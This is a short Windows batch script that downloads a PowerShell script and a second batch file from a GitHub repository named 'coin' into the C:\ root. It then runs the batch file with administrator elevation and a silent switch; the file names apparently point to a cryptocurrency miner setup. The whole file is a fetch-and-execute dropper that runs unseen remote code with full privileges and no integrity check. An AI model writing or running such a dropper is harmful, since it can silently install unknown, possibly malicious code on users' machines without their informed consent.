@echo off
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRPSETUP.ps1' -OutFile 'C:\XRPSETUP.ps1'"
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRPSETUP.ps1' -OutFile 'C:\XRPSETUP.ps1'"
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/RUNSYS_XRP.bat' -OutFile 'C:\RUNSYS_XRP.bat'"
powershell -NoProfile -Command "Start-Process -FilePath 'C:\RUNSYS_XRP.bat' -ArgumentList '/S' -Verb RunAs"
exit
